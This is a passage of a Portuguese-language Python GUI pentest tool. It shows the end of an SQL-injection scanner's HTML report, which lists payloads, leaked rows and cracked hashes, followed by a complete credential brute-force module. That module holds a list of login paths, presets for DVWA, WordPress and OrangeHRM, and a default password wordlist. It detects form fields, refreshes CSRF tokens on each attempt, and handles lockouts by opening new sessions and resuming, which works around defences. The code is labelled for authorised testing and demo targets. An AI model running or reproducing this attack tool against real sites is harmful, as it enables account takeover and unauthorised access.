        for i, (param, payload, desc, detail, test_url, leaked) in enumerate(self.findings, 1):
            data = "".join(f"<li>{html.escape(x)}</li>" for x in leaked[:20])
            findings += f"""
        <div class="card">
          <h3>Achado #{i}</h3>
          <p><b>Parâmetro:</b> {html.escape(param)}</p>
          <p><b>Técnica:</b> {html.escape(desc)}</p>
          <p><b>Payload:</b> <code>{html.escape(payload)}</code></p>
          <p><b>Evidência:</b> {html.escape(detail)}</p>
          <p><b>URL:</b> {html.escape(test_url)}</p>
          <ul>{data}</ul>
        </div>
        """

        hashes = ""
        for htype, h, ctx, source, cracked in self.hash_findings:
            crack = (f'<b style="color:#ff7518">Quebrado: {html.escape(cracked)}</b>'
                     if cracked else "Não quebrado")
            hashes += f"""
        <div class="card" style="border-left-color:#00ff41">
          <h3>{html.escape(htype)}</h3>
          <p><b>Hash:</b> <code>{html.escape(h)}</code></p>
          <p><b>Contexto:</b> {html.escape(ctx)}</p>
          <p><b>Origem:</b> {html.escape(source)}</p>
          <p>{crack}</p>
        </div>
        """

        recon = ""
        for entry, status, length, elapsed, target in sorted(self.recon_findings, key=lambda x: x[1]):
            recon += f"""
        <tr>
          <td><code>/{html.escape(entry)}</code></td>
          <td>{status}</td>
          <td>{length}</td>
          <td>{elapsed:.1f}s</td>
          <td><code>{html.escape(target)}</code></td>
        </tr>
        """

        doc = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<title>Relatório SQLi</title>
<style>
 body{{font-family:Consolas,monospace;background:#050805;color:#00ff41;padding:25px}}
 main{{max-width:1250px;margin:auto}}
 header{{background:#0b120b;border:1px solid #00ff41;padding:25px;border-radius:10px}}
 .stat{{display:inline-block;background:#0b120b;border:1px solid #00b32d;padding:18px;margin:10px 5px;border-radius:8px}}
 table{{width:100%;border-collapse:collapse;background:#0b120b}}
 th{{background:#003b00;color:#00ff41;padding:9px}}
 td{{padding:8px;border-bottom:1px solid #004d00;vertical-align:top}}
 code{{background:#001100;padding:3px;word-break:break-all}}
 .card{{background:#0b120b;margin:15px 0;padding:18px;border-left:5px solid #00ff41;border-radius:8px}}
 .pwd{{color:#ff7518;font-weight:bold}}
 footer{{margin-top:20px;color:#00b32d;font-size:12px}}
</style>
</head>
<body>
<main>
<header>
  <h1>&#128737; Relatório de SQL Injection</h1>
  <p><b>Alvo:</b> {html.escape(self.url.get())}</p>
  <p>Gerado em: {datetime.now():%d/%m/%Y %H:%M}</p>
</header>

<div class="stat"><b>{len(self.findings)}</b><br>Achados SQLi</div>
<div class="stat"><b>{len(self.results)}</b><br>Testes</div>
<div class="stat"><b>{len(self.hash_findings)}</b><br>Hashes</div>
<div class="stat"><b>{len(self.recon_findings)}</b><br>Recursos</div>

<h2>&#128270; Evidências SQLi</h2>
{findings or "<p>Nenhum achado confirmado.</p>"}

<h2>&#128273; Hashes Encontrados</h2>
{hashes or "<p>Nenhum hash encontrado.</p>"}

<h2>&#128193; Recon (Wordlist)</h2>
<table>
  <tr><th>Recurso</th><th>Status</th><th>Bytes</th><th>Tempo</th><th>URL</th></tr>
  {recon or "<tr><td colspan=5>Nenhum recurso encontrado.</td></tr>"}
</table>

<h2>&#128203; Todos os testes</h2>
<table>
  <tr><th>Parâmetro</th><th>Payload</th><th>Técnica</th><th>Status</th>
      <th>Bytes</th><th>Tempo</th><th>Resultado</th><th>Evidência</th></tr>
  {rows}
</table>

<h2>&#128274; Recomendações</h2>
<ul>
  <li>Use queries parametrizadas/prepared statements.</li>
  <li>Valide os tipos e formatos das entradas.</li>
  <li>Use princípio do menor privilégio no banco.</li>
  <li>Não exponha erros SQL ao usuário.</li>
  <li>Use hashes fortes com salt (bcrypt/argon2) e nunca MD5/SHA-1 para senhas.</li>
  <li>Use WAF como camada complementar, não como substituto.</li>
</ul>

<footer>SQLi Scanner — somente para testes autorizados</footer>
</main>
</body>
</html>"""

        try:
            with open(filename, "w", encoding="utf-8") as fh:
                fh.write(doc)
            self.write(f"[+] Relatório salvo: {filename}")
            webbrowser.open(filename)
        except OSError as e:
            self.write(f"[ERRO] Salvando relatório: {e}")


# =====================================================================
# ABA 3 — LOGIN BRUTE FORCE MULTI-ENDPOINT
# =====================================================================
LOCKOUT_PAUSA_SEGUNDOS = 300
RETRY_PAUSA_SEGUNDOS = 10

CAMINHOS_LOGIN = [
    "/login.aspx", "/login.php", "/auth/login.php", "/admin/login.php",
    "/admin/login", "/login", "/accounts/login", "/user/login", "/login.jsp",
    "/j_security_check", "/login.action", "/wp-login.php", "/wp-admin",
    "/signin", "/login.html", "/Account/Login", "/setup.php",
    "/web/index.php/auth/login", "/auth/login", "/auth/signin", "/sign-in",
    "/logon", "/user/signin", "/users/login", "/member/login", "/members/login",
    "/account/login", "/accounts/login", "/customer/login", "/client/login",
    "/portal/login", "/dashboard/login", "/admin", "/admin/index.php",
    "/administrator", "/administrator/index.php", "/cpanel", "/controlpanel",
    "/backend/login", "/backend", "/web/login", "/web/index.php/login",
    "/index.php/login", "/index.php/auth/login", "/auth", "/login/index.php",
    "/user/auth/login", "/practice-test-login", "/practice-test-login/",
]

PRESETS = {
    "OrangeHRM 5 (demo)": {
        "path": "/web/index.php/auth/login",
        "action": "/web/index.php/auth/validate",
        "method": "post",
        "user": "username",
        "pass": "password",
        "token": "_token",
        "extra": "",
    },
    "DVWA": {
        "path": "/login.php",
        "action": "/login.php",
        "method": "post",
        "user": "username",
        "pass": "password",
        "token": "user_token",
        "extra": "",
    },
    "WordPress": {
        "path": "/wp-login.php",
        "action": "/wp-login.php",
        "method": "post",
        "user": "log",
        "pass": "pwd",
        "token": "",
        "extra": "wp-submit=Log+In;redirect_to=%2Fwp-admin%2F;testcookie=1",
    },
    "Herokuapp (the-internet)": {
        "path": "/login",
        "action": "/authenticate",
        "method": "post",
        "user": "username",
        "pass": "password",
        "token": "",
        "extra": "",
    },
    "SauceDemo (Swag Labs)": {
        "path": "/",
        "action": "/",
        "method": "post",
        "user": "user-name",
        "pass": "password",
        "token": "",
        "extra": "login-button=Login",
    },
    "Practice Test Automation": {
        "path": "/practice-test-login/",
        "action": "/practice-test-login/",
        "method": "post",
        "user": "username",
        "pass": "password",
        "token": "",
        "extra": "",
    },
}

FIM_LOGIN_RE = re.compile(r"/([^/]*?(?:login|signin|logon|auth)[^/]*?)/?$", re.I)
PAGINA_SETUP_RE = re.compile(r"/setup\.php$", re.I)

USER_RE = re.compile(r"(user|username|login|email|account|j_username|usuario|mail|utilizador)", re.I)
TOKEN_RE = re.compile(r"(csrf|token|nonce|authenticity)", re.I)
PASS_RE = re.compile(r"(pass|senha|pwd)", re.I)

FALHA_RE = re.compile(
    r"(login failed|invalid (username|password|credentials?)|incorrect password|"
    r"wrong password|senha incorreta|credenciais inv[áa]lidas|"
    r"usu[áa]rio ou senha (inv[áa]lido|incorret)|autentica[çc][ãa]o falhou|"
    r"falha no login|access denied|login inv[áa]lido|"
    r"password.*(wrong|invalid|incorrect)|usu[áa]rio n[ãa]o encontrado|"
    r"(your )?(username|user name|password) is (invalid|incorrect)|"
    r"epic sadface|do not match any user|"
    r"account (is )?locked|maximum login attempts|"
    r"exceeded the maximum number of login attempts|"
    r"too many (failed )?login attempts|muitas tentativas|"
    r"invalid_csrf_token|csrf token validation failed)",
    re.IGNORECASE,
)
LOCKOUT_RE = re.compile(
    r"(account (is )?locked|locked out|maximum login attempts|"
    r"exceeded the maximum number of login attempts|"
    r"too many (failed )?login attempts|muitas tentativas|bloquead)",
    re.IGNORECASE,
)
SUCESSO_RE = re.compile(
    r"(dashboard|logout|log out|bem-vindo|welcome|congratulations|"
    r"logged in successfully)",
    re.IGNORECASE,
)


def montar_login_url(url):
    url = (url or "").strip()
    url = re.sub(r"\?.*", "", url)
    if not url:
        return ""
    if PAGINA_SETUP_RE.search(url):
        return PAGINA_SETUP_RE.sub("/login.php", url)
    if "orangehrm" in url.lower() and "/web/index.php" not in url:
        return url.rstrip("/") + "/web/index.php/auth/login"
    if re.match(r"^https?://[^/]+$", url):
        return url + "/"
    if FIM_LOGIN_RE.search(url):
        return url
    if "/" in url.split("://", 1)[-1]:
        return url
    return url + "/login.php"


DEFAULT_WORDLIST = [
    "password", "admin", "admin123", "123456", "12345678", "dvwa", "letmein",
    "root", "toor", "test", "teste", "senha", "senha123", "qwerty", "abc123",
    "welcome", "monkey", "dragon", "master", "iloveyou", "batman", "p@ssw0rd",
    "Passw0rd!", "Password123", "administrator", "changeme", "1234", "12345", "default",
    "user", "usuario", "dvwa123", "secret", "security", "hacker", "admin123456",
    "SuperSecretPassword!", "password1", "password12", "password1234", "password2024",
    "password2025", "password2026", "admin1", "admin12", "admin1234", "admin12345",
    "administrator123", "guest", "guest123", "demo", "demo123", "testing", "login",
    "login123", "pass", "pass123", "passwd", "passwd123", "senha1234", "senha2024",
    "senha2025", "senha2026", "welcome1", "welcome123", "letmein123", "qwerty123",
    "qwertyuiop", "asdfgh", "asdf123", "zxcvbnm", "abcd1234", "master123", "football",
    "baseball", "soccer", "superman", "pokemon", "naruto", "internet", "computer",
    "windows", "linux", "ubuntu", "debian", "kali", "raspberry", "oracle", "mysql",
    "postgres", "mongodb", "docker", "kubernetes", "root123", "root1234", "adminadmin",
    "1234567", "123456789", "1234567890", "111111", "000000", "121212", "654321",
    "987654321", "1q2w3e4r", "1qaz2wsx", "zaq12wsx", "!@#$%^&*", "P@ssw0rd", "Welcome1",
    "Welcome123", "Admin123", "Admin@123", "Root@123", "Password@123", "Password123!",
    "Qwerty123!", "mutillidae", "owasp", "owaspbwa", "metasploitable", "trustno1",
    "welcomehome", "summer2024", "summer2025", "summer2026", "winter2024", "winter2025",
    "spring2025", "autumn2025", "administrator1", "sysadmin", "sysadmin123", "operator",
    "operator123", "support", "support123", "backup", "backup123", "service", "service123",
    "manager", "manager123", "company123", "office123", "network123", "server123",
    "localadmin", "local123", "temp123", "temp2025", "dev123", "developer",
    "developer123", "qa123", "staging123", "production", "production123",
]


def parse_campos_extras(texto):
    extras = {}
    if not texto:
        return extras
    for parte in re.split(r"[;,]", texto):
        parte = parte.strip()
        if not parte or "=" not in parte:
            continue
        nome, _, valor = parte.partition("=")
        extras[nome.strip()] = valor.strip()
    return extras


class BruteForceLogin:
    def __init__(self, login_url, username, passwords, log, progress, stop_event,
                 result_callback, verbose=True, renovar_token=True, delay=0.0,
                 inicio=0, manual=None):
        self.login_url = montar_login_url(login_url)
        self.username = username
        self.passwords = passwords
        self.log = log
        self.progress = progress
        self.stop = stop_event
        self.result_callback = result_callback
        self.verbose = verbose
        self.renovar_token = renovar_token
        self.delay = delay
        self.inicio = inicio
        self.manual = manual or {}
        self.spa = False
        self.session = requests.Session()
        self._config_headers()
        self.found = False
        self._ultimo_texto = ""

    def _config_headers(self):
        self.session.headers.update({
            "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                           "AppleWebKit/537.36 (KHTML, like Gecko) "
                           "Chrome/126.0 Safari/537.36"),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
        })

    def _sleep_interruptivel(self, segundos):
        fim = time.time() + segundos
        while time.time() < fim:
            if self.stop.is_set():
                return False
            time.sleep(min(0.2, fim - time.time()))
        return True

    def _get_pagina_login(self):
        try:
            r = self.session.get(self.login_url, verify=False, timeout=10)
        except requests.exceptions.RequestException as e:
            self.log(f"[!] Erro ao obter a página de login: {e}")
            return None
        if r.status_code == 404:
            self.log("[!] HTTP 404: página de login não encontrada neste caminho.")
            self.log("[i] Use o menu 'Caminho comum' (ex.: /auth/login.php, /login.jsp).")
            return None
        if r.status_code in (401, 403):
            self.log(f"[!] HTTP {r.status_code}: página protegida (Basic Auth?) — "
                     f"este script não cobre autenticação HTTP básica.")
            return None
        return r

    def _parse_form(self, html_text, page_url):
        if BeautifulSoup is None:
            self.log("[!] beautifulsoup4 não instalado. Execute: pip install beautifulsoup4")
            return None
        soup = BeautifulSoup(html_text, "html.parser")
        form = None
        for f in soup.find_all("form"):
            if f.find("input", {"type": "password"}):
                form = f
                break
        if form is None:
            return None

        action_url = urljoin(page_url, form.get("action") or page_url)
        method = (form.get("method") or "post").lower()
        campos, submit = {}, {}
        user_field = pass_field = None
        inputs = form.find_all("input")

        for inp in inputs:
            nome = inp.get("name")
            if not nome:
                continue
            tipo = (inp.get("type") or "text").lower()
            valor = inp.get("value") or ""
            if tipo == "password":
                if pass_field is None:
                    pass_field = nome
                campos[nome] = ""
            elif tipo in ("submit", "button", "image"):
                submit[nome] = valor
            elif tipo in ("text", "hidden", "email", "tel", "number", "search", "url"):
                campos[nome] = valor

        for btn in form.find_all("button"):
            if (btn.get("type") or "submit").lower() in ("submit", "button"):
                nome = btn.get("name")
                if nome and nome not in submit:
                    submit[nome] = btn.get("value") or ""

        for sel in form.find_all("select"):
            nome = sel.get("name")
            if nome and nome not in campos:
                opcao = sel.find("option", selected=True) or sel.find("option")
                campos[nome] = opcao.get("value", "") if opcao else ""

        for ta in form.find_all("textarea"):
            nome = ta.get("name")
            if nome and nome not in campos:
                campos[nome] = ta.get_text()

        if pass_field is None:
            for inp in inputs:
                nome = inp.get("name") or ""
                if PASS_RE.search(nome):
                    pass_field = nome
                    campos.setdefault(nome, "")
                    break
        if pass_field is None:
            return None

        for inp in inputs:
            nome = inp.get("name") or ""
            tipo = (inp.get("type") or "text").lower()
            if tipo in ("text", "email", "tel", "number", "search") and USER_RE.search(nome):
                user_field = nome
                break
        if user_field is None:
            for inp in inputs:
                nome = inp.get("name") or ""
                tipo = (inp.get("type") or "text").lower()
                if (tipo in ("text", "email", "tel", "number", "search") and nome
                        and nome != pass_field and not TOKEN_RE.search(nome)):
                    user_field = nome
                    break
        if user_field is None:
            return None

        token_field = token_val = None
        for inp in inputs:
            nome = inp.get("name") or ""
            tipo = (inp.get("type") or "text").lower()
            if tipo == "hidden" and TOKEN_RE.search(nome):
                token_field = nome
                token_val = inp.get("value") or ""
                break

        return (action_url, method, campos, submit,
                user_field, pass_field, token_field, token_val)

    def _extrair_token(self, texto):
        if not texto or BeautifulSoup is None:
            return None
        soup = BeautifulSoup(texto, "html.parser")
        for inp in soup.find_all("input"):
            nome = inp.get("name") or ""
            if TOKEN_RE.search(nome):
                valor = inp.get("value")
                if valor:
                    return html.unescape(valor)
        for meta in soup.find_all("meta"):
            nome = meta.get("name") or ""
            if TOKEN_RE.search(nome):
                valor = meta.get("content")
                if valor:
                    return html.unescape(valor)
        m = re.search(r"<auth-login[^>]*:token\s*=\s*[\"']([^\"']+)[\"']", texto, re.I)
        if m:
            valor = html.unescape(m.group(1))
            if len(valor) >= 2 and valor[0] == valor[-1] == '"':
                valor = valor[1:-1]
            return valor
        m = re.search(r"data-(?:csrf-?token|token)\s*=\s*[\"']([^\"']+)[\"']", texto, re.I)
        if m:
            return html.unescape(m.group(1))
        m = re.search(r"[\"']csrfToken[\"']\s*:\s*[\"']([^\"']+)[\"']", texto, re.I)
        if m:
            return html.unescape(m.group(1))
        return None

    def _tem_campo_senha(self, texto):
        return bool(texto) and re.search(
            r"type\s*=\s*['\"]password['\"]", texto, re.I) is not None

    def _detectar_conhecido(self, texto, url):
        amostra = (url or "") + " " + (texto or "")[:4000]
        if re.search(r"orangehrm|auth-login", amostra, re.I):
            return {
                "nome": "OrangeHRM 5",
                "action": "/web/index.php/auth/validate",
                "method": "post",
                "user_field": "username",
                "pass_field": "password",
                "token_field": "_token",
                "extra": {},
            }
        if re.search(r"practice-test-login", amostra, re.I):
            return {
                "nome": "Practice Test Automation",
                "action": "/practice-test-login/",
                "method": "post",
                "user_field": "username",
                "pass_field": "password",
                "token_field": None,
                "extra": {},
            }
        return None

    def _montar_form_manual(self, page_url, texto):
        action = (self.manual.get("action") or "").strip()
        method = (self.manual.get("method") or "post").lower()
        user_field = (self.manual.get("user_field") or "").strip()
        pass_field = (self.manual.get("pass_field") or "").strip()
        token_field = (self.manual.get("token_field") or "").strip() or None
        if not (action and user_field and pass_field):
            self.log("[!] Modo manual incompleto: action, campo usuário e "
                     "campo senha são obrigatórios.")
            return None
        action_url = urljoin(page_url, action)
        campos = dict(self.manual.get("extra") or {})
        token_val = self._extrair_token(texto) if token_field else None
        return (action_url, method, campos, {}, user_field, pass_field,
                token_field, token_val)

    def _obter_formulario(self, pagina):
        if self.manual:
            return self._montar_form_manual(pagina.url, pagina.text)
        return self._parse_form(pagina.text, pagina.url)

    def _tentar(self, senha, campos, submit, token_field, token_val,
                action_url, method, user_field, pass_field):
        data = dict(campos)
        data[user_field] = self.username
        data[pass_field] = senha
        if submit:
            data.update(submit)
        if token_field and token_val:
            data[token_field] = token_val

        try:
            if method == "get":
                r = self.session.get(action_url, params=data,
                                     headers={"Referer": self.login_url},
                                     verify=False, timeout=10, allow_redirects=False)
            else:
                r = self.session.post(action_url, data=data,
                                      headers={"Referer": self.login_url},
                                      verify=False, timeout=10, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            self.log(f"[!] Erro na tentativa: {e}")
            return None

        self._ultimo_texto = r.text or ""

        if r.status_code == 429:
            retry = r.headers.get("Retry-After", "")
            pausa = int(retry) if retry.strip().isdigit() else RETRY_PAUSA_SEGUNDOS
            self.log(f"[!] HTTP 429 (rate limit). Aguardando {pausa}s...")
            self._sleep_interruptivel(pausa)
            return None

        if r.status_code in (301, 302, 303, 307, 308):
            loc = r.headers.get("Location", "")
            if re.search(r"(login|logon|signin|auth|error|failed|denied)", loc, re.I):
                return False
            return True

        if r.status_code in (401, 403):
            return False

        ct = r.headers.get("Content-Type", "")
        if "json" in ct.lower():
            if re.search(r'"success"\s*:\s*true|"token"\s*:|"authenticated"\s*:\s*true|'
                         r'"status"\s*:\s*"(ok|success)"', r.text, re.I):
                return True
            return False

        if LOCKOUT_RE.search(r.text) or FALHA_RE.search(r.text):
            return False

        if SUCESSO_RE.search(r.text):
            return True

        if self.spa:
            return False

        if not self._tem_campo_senha(r.text):
            return True
        return False

    def run(self):
        total = len(self.passwords)
        retomando = self.inicio > 0

        if retomando:
            self.log(f"\n[*] Retomando da senha: {self.inicio + 1} "
                     f"({self.passwords[self.inicio]}) — "
                     f"{total - self.inicio} restantes")
            self.log("")
        else:
            self.log(f"\n[*] Alvo    : {self.login_url}")
            self.log(f"\n[*] Usuário : {self.username} | Senhas a testar: {total}")
            self.log("")

        pagina = self._get_pagina_login()
        if pagina is None:
            return
        if not retomando:
            self.log(f"[*] Página de login obtida (HTTP {pagina.status_code}, "
                     f"{len(pagina.text)} bytes)")

        if "setup.php" in pagina.url.lower():
            self.log("")
            self.log("[!] DVWA redirecionou para setup.php -> banco de dados NÃO criado.")
            self.log(f"[!] Acesse {pagina.url.split('?')[0]} e clique em "
                     f"'Create / Reset Database'.")
            return

        form = None
        if not self.manual:
            form = self._parse_form(pagina.text, pagina.url)
            if form is None:
                auto = self._detectar_conhecido(pagina.text, self.login_url)
                if auto is None:
                    self.log("")
                    self.log("[!] Nenhum formulário de login encontrado (campo type=password ausente).")
                    self.log("[i] A página pode ser renderizada via JavaScript (SPA/React/Vue).")
                    self.log("[i] 1) Confirme a URL correta (ex.: /web/index.php/auth/login no OrangeHRM).")
                    self.log("[i] 2) Ou ative o painel 'Modo manual (SPA ou campos customizados)'")
                    self.log("[i]    e escolha um preset, informando action, campos e token.")
                    return
                self.log("")
                self.log(f"[+] Site conhecido detectado ({auto.get('nome', 'aplicação')}) — "
                         f"usando configuração automática\n")
                self.manual = auto
                self.spa = True
                form = self._obter_formulario(pagina)
        else:
            self.spa = True
            form = self._obter_formulario(pagina)

        if form is None:
            self.log("[!] Não foi possível montar o formulário. Abortando.")
            return

        (action_url, method, campos, submit,
         user_field, pass_field, token_field, token_val) = form

        if not retomando:
            self.log(f"\n[*] Formulário : action={action_url} | method={method.upper()}")
            self.log(f"\n[*] Campo user : '{user_field}' | campo senha: '{pass_field}'\n")
            if campos:
                self.log(f"[*] Campos extras: {campos}\n")
            if submit:
                self.log(f"[*] Botão submit: {submit}")
            if token_field:
                self.log(f"\n[+] Token CSRF : '{token_field}' -> renovado a cada tentativa")
            else:
                self.log("\n[i] Token CSRF : não detectado -> atacando direto")
            self.log("")

        for idx in range(self.inicio, total):
            if self.stop.is_set():
                self.log("\n[*] Ataque interrompido pelo usuário. Clique em "
                         ">> Iniciar Ataque << para continuar de onde parou.")
                return
            if self.found:
                return
            i = idx + 1
            pwd = self.passwords[idx].strip()
            if not pwd:
                continue

            if self.verbose:
                self.log(f"[{i}/{total}] Testando:   {pwd}")
            self.progress(i, total, pwd)

            res = self._tentar(pwd, campos, submit, token_field, token_val,
                               action_url, method, user_field, pass_field)

            if res is None:
                if not self._sleep_interruptivel(2):
                    return
                continue

            if res:
                self.found = True
                self.log("")
                self.log("=" * 55)
                self.log(f"\n[+] SENHA ENCONTRADA: {pwd}")
                self.log(f"\n[+] Credenciais \n\nUSUARIO: {self.username}   \n\nSENHA: {pwd}\n")
                self.log("=" * 55)
                self.result_callback(self.username, pwd)
                return

            if LOCKOUT_RE.search(self._ultimo_texto):
                self.log(f"[!] Lockout detectado. Nova sessão + pausa de "
                         f"{LOCKOUT_PAUSA_SEGUNDOS}s...")
                self.session = requests.Session()
                self._config_headers()
                if not self._sleep_interruptivel(LOCKOUT_PAUSA_SEGUNDOS):
                    self.log("[*] Pausa interrompida pelo usuário.")
                    return
                pagina2 = self._get_pagina_login()
                if pagina2 is None:
                    return
                form2 = self._obter_formulario(pagina2)
                if form2 is None:
                    self.log("[!] Formulário não encontrado após lockout. Abortando.")
                    return
                (action_url, method, campos, submit,
                 user_field, pass_field, token_field, token_val) = form2
                continue

            if token_field and self.renovar_token:
                token_val = self._extrair_token(self._ultimo_texto)
                if token_val is None:
                    if not self._sleep_interruptivel(1):
                        return
                    r2 = self._get_pagina_login()
                    token_val = self._extrair_token(r2.text) if r2 else None
                if token_val is None:
                    self.log("[!] Token não renovado; pausa de 3s...")
                    if not self._sleep_interruptivel(3):
                        return
                    r2 = self._get_pagina_login()
                    token_val = self._extrair_token(r2.text) if r2 else None
                if token_val is None:
                    self.log("[!] Abortando: servidor parou de fornecer token CSRF.")
                    return

            if self.delay > 0:
                if not self._sleep_interruptivel(self.delay):
                    return

        if not self.found:
            self.log(f"[-] Nenhuma senha válida encontrada em {total} tentativas.")


class LoginTab(ttk.Frame):
    def __init__(self, parent):
        super().__init__(parent, padding=8)
        self.stop_event = threading.Event()
        self.worker = None
        self.queue = queue.Queue()
        self.senha_encontrada = None
        self.proximo_indice = 0
        self.fonte_wordlist = ""
        self.parado_pelo_usuario = False
        self._build_ui()
        self._poll_queue()

    def _build_ui(self):
        frm = ttk.LabelFrame(self, text="Configuração do Alvo", padding=5)
        frm.pack(fill="x", padx=4, pady=6)

        ttk.Label(frm, text="URL (base ou página de login):").grid(
            row=0, column=0, sticky="w", padx=5, pady=4)
        self.url_var = tk.StringVar(
            value="https://opensource-demo.orangehrmlive.com/web/index.php/auth/login")
        ttk.Entry(frm, textvariable=self.url_var, width=48).grid(
            row=0, column=1, sticky="we", padx=5, pady=4)

        ttk.Label(frm, text="Caminho comum:").grid(
            row=1, column=0, sticky="w", padx=5, pady=4)
        self.path_var = tk.StringVar()
        self.path_combo = ttk.Combobox(frm, textvariable=self.path_var,
                                       values=CAMINHOS_LOGIN, state="readonly", width=46)
        self.path_combo.grid(row=1, column=1, sticky="we", padx=5, pady=4)
        self.path_combo.bind("<<ComboboxSelected>>", self.aplicar_caminho)

        ttk.Label(frm, text="Usuário:").grid(
            row=2, column=0, sticky="w", padx=5, pady=4)
        self.user_var = tk.StringVar(value="Admin")
        ttk.Entry(frm, textvariable=self.user_var, width=48).grid(
            row=2, column=1, sticky="we", padx=5, pady=4)

        ttk.Label(frm, text="Wordlist (senhas):", style="Orange.TLabel").grid(
            row=3, column=0, sticky="w", padx=5, pady=4)
        self.wordlist_var = tk.StringVar(value="")
        ttk.Entry(frm, textvariable=self.wordlist_var, width=48).grid(
            row=3, column=1, sticky="we", padx=5, pady=4)
        ttk.Button(frm, text="Procurar...", command=self.browse).grid(row=3, column=2, padx=5, pady=4)

        opts = ttk.Frame(frm)
        opts.grid(row=4, column=1, sticky="w", padx=5, pady=4)
        self.verbose_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(opts, text="Mostrar cada tentativa",
                        variable=self.verbose_var).pack(side="left", padx=4)
        self.token_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(opts, text="Renovar token CSRF",
                        variable=self.token_var).pack(side="left", padx=4)
        ttk.Label(opts, text="Delay (s):").pack(side="left", padx=(8, 2))
        self.delay_var = tk.DoubleVar(value=0.0)
        ttk.Spinbox(opts, from_=0.0, to=10.0, increment=0.5,
                    textvariable=self.delay_var, width=5).pack(side="left")
        frm.columnconfigure(1, weight=1)

        frm_man = ttk.LabelFrame(
            self, text="Modo manual (SPA ou campos customizados) — ignorado se não ativado",
            padding=5)
        frm_man.pack(fill="x", padx=4, pady=4)

        linha0 = ttk.Frame(frm_man)
        linha0.pack(fill="x", padx=5, pady=2)
        ttk.Label(linha0, text="Preset:").pack(side="left")
        self.preset_var = tk.StringVar()
        self.preset_combo = ttk.Combobox(linha0, textvariable=self.preset_var,
                                         values=list(PRESETS.keys()),
                                         state="readonly", width=30)
        self.preset_combo.pack(side="left", padx=4)
        self.preset_combo.bind("<<ComboboxSelected>>", self.aplicar_preset)
        self.manual_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(linha0, text="Ativar modo manual",
                        variable=self.manual_var).pack(side="left", padx=8)
        ttk.Label(linha0, text="(ignora a detecção automática)").pack(side="left")

        linha1 = ttk.Frame(frm_man)
        linha1.pack(fill="x", padx=5, pady=2)
        ttk.Label(linha1, text="Action:").pack(side="left")
        self.man_action_var = tk.StringVar()
        ttk.Entry(linha1, textvariable=self.man_action_var, width=52).pack(side="left", padx=4)
        ttk.Label(linha1, text="Método:").pack(side="left")
        self.man_method_var = tk.StringVar(value="POST")
        ttk.Combobox(linha1, textvariable=self.man_method_var, values=["POST", "GET"],
                     state="readonly", width=6).pack(side="left")

        linha2 = ttk.Frame(frm_man)
        linha2.pack(fill="x", padx=5, pady=2)
        ttk.Label(linha2, text="Campo usuário:").pack(side="left")
        self.man_user_var = tk.StringVar(value="username")
        ttk.Entry(linha2, textvariable=self.man_user_var, width=14).pack(side="left", padx=4)
        ttk.Label(linha2, text="Campo senha:").pack(side="left")
        self.man_pass_var = tk.StringVar(value="password")
        ttk.Entry(linha2, textvariable=self.man_pass_var, width=14).pack(side="left", padx=4)
        ttk.Label(linha2, text="Token CSRF:").pack(side="left")
        self.man_token_var = tk.StringVar(value="_token")
        ttk.Entry(linha2, textvariable=self.man_token_var, width=20).pack(side="left", padx=4)

        linha3 = ttk.Frame(frm_man)
        linha3.pack(fill="x", padx=5, pady=2)
        ttk.Label(linha3, text="Campos extras:").pack(side="left")
        self.man_extra_var = tk.StringVar()
        ttk.Entry(linha3, textvariable=self.man_extra_var, width=52).pack(side="left", padx=4)
        ttk.Label(linha3, text="ex.: login-button=Login;redirect_to=/").pack(side="left")

        botoes = ttk.Frame(self)
        botoes.pack(fill="x", padx=4, pady=4)
        self.btn_start = ttk.Button(botoes, text=">> Iniciar Ataque <<", command=self.start)
        self.btn_start.pack(side="left", padx=5)
        self.btn_stop = ttk.Button(botoes, text="[] Parar", command=self.stop,
                                   state="disabled")
        self.btn_stop.pack(side="left", padx=5)
        self.btn_save = ttk.Button(botoes, text="[ Salvar Senha ]", command=self.salvar_senha)
        self.btn_save.pack(side="left", padx=5)

        self.progress_var = tk.DoubleVar(value=0)
        ttk.Progressbar(self, variable=self.progress_var, maximum=100).pack(
            fill="x", padx=4, pady=4)
        self.status_var = tk.StringVar(value="Pronto. Escolha um caminho comum ou digite a URL.")
        ttk.Label(self, textvariable=self.status_var).pack(anchor="w", padx=8)

        log_frame = ttk.LabelFrame(self, text=" Saída ", padding=5)
        log_frame.pack(fill="both", expand=True, padx=4, pady=6)
        self.log_area = make_log(log_frame)
        self.log_area.pack(fill="both", expand=True)

    def aplicar_caminho(self, _event=None):
        url = self.url_var.get().strip().rstrip("/")
        caminho = self.path_var.get().strip()
        if not caminho:
            return
        if not url:
            self.url_var.set(caminho)
            return
        m = re.match(r"^(https?://[^/]+)", url)
        if m:
            self.url_var.set(m.group(1) + caminho)

    def aplicar_preset(self, _event=None):
        preset = PRESETS.get(self.preset_var.get())
        if not preset:
            return
        url = self.url_var.get().strip().rstrip("/")
        m = re.match(r"^(https?://[^/]+)", url)
        base = m.group(1) if m else ""
        self.url_var.set(base + preset["path"])
        self.man_action_var.set(base + preset["action"])
        self.man_user_var.set(preset["user"])
        self.man_pass_var.set(preset["pass"])
        self.man_token_var.set(preset["token"])
        self.man_method_var.set(preset["method"].upper())
        self.man_extra_var.set(preset.get("extra", ""))

    def browse(self):
        path = filedialog.askopenfilename(
            title="Selecione a wordlist",
            filetypes=[("Arquivos de texto", "*.txt"), ("Todos", "*.*")])
        if path:
            self.wordlist_var.set(path)

    def salvar_senha(self):
        if not self.senha_encontrada:
            messagebox.showinfo("Salvar Senha",
                                "Nenhuma senha encontrada até agora.\n"
                                "Execute o ataque e aguarde o resultado [+].")
            return
        usuario, senha = self.senha_encontrada
        texto = (f"[+] SENHA ENCONTRADA: {senha}\n"
                 f"\n[+] Credenciais \n\nUSUARIO: {usuario} \n\nSENHA: {senha}\n")
        agora = time.strftime("Data  %d_%m_%Y   Hora %H_%M_%S")
        path = filedialog.asksaveasfilename(
            title="Salvar senha encontrada",
            defaultextension=".txt",
            initialfile=f"senha_{agora}.txt",
            filetypes=[("Arquivos de texto", "*.txt"), ("Todos", "*.*")])
        if not path:
            return
        try:
